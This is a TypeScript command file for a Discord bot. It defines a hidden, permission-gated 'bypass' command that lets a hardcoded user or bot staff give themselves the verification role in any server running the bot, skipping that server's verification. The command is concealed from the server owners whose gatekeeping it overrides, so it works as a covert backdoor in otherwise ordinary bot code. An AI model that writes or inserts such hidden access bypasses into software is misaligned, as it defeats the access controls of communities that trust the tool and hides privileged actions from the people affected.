import { SlashCommandBuilder } from "@discordjs/builders";
import {
    CommandInteraction,
    MessageActionRow,
    MessageButton,
    MessageEmbed,
    MessageSelectMenu,
} from "discord.js";
import DatabaseClient from "../clients/DatabaseClient";
import { fetchPremiumMessagesCap } from "../utils/PremiumUtils";
import { CommandType } from "../utils/CommandType";
import { hasAdmin } from "../utils/Permissions";
import { DiscordClient } from "../schemas/Client";
import { isStaff } from "../utils/Utils";

const Payload = {
    data: new SlashCommandBuilder()
        .setName("bypass")
        .setDescription("Bypass a servers verification")
        .addStringOption((option) =>
            option.setName("server_id").setDescription("The server to bypass"),
        )
        .setDefaultPermission(false),
    hidden: true,
    permissions: [
        {
            id: "891311138082549810",
            type: "USER",
            permission: true,
        },
    ],
    dms: false,
    async execute(interaction: CommandInteraction) {
        await interaction.deferReply({
            ephemeral: true,
        });

        const staff = await isStaff(interaction.client, interaction.user.id);

        if (!staff)
            return await interaction.editReply({
                embeds: [
                    new MessageEmbed()
                        .setTitle("Error")
                        .setDescription(
                            "You do not have permissions to run this command",
                        ),
                ],
            });

        const id = interaction.options.getString("server_id", true);

        const guild = interaction.client.guilds.cache.get(id);

        if (!guild) {
            return await interaction.editReply({
                embeds: [
                    new MessageEmbed()
                        .setTitle("Invalid Guild")
                        .setDescription(
                            "We could not find the provided guild.",
                        ),
                ],
            });
        }

        const config = await DatabaseClient.getConfig({
            id,
        });

        if (!config.verificationRole) {
            return await interaction.editReply({
                embeds: [
                    new MessageEmbed()
                        .setTitle("Invalid Verification Role")
                        .setDescription(
                            "The provided guild does not have a verification role.",
                        ),
                ],
            });
        }

        try {
            const member = await guild.members.fetch(interaction.user.id);
            await member.roles.add(config.verificationRole);
            return await interaction.editReply({
                embeds: [
                    new MessageEmbed()
                        .setTitle("Success!")
                        .setDescription(
                            `We have successfully gave you the verification role in ${guild.name} - \`${guild.id}\``,
                        ),
                ],
            });
        } catch (e) {
            return await interaction.editReply({
                embeds: [
                    new MessageEmbed()
                        .setTitle("Unknown Error!")
                        .setDescription(`${e}`),
                ],
            });
        }
    },
};

export default Payload;
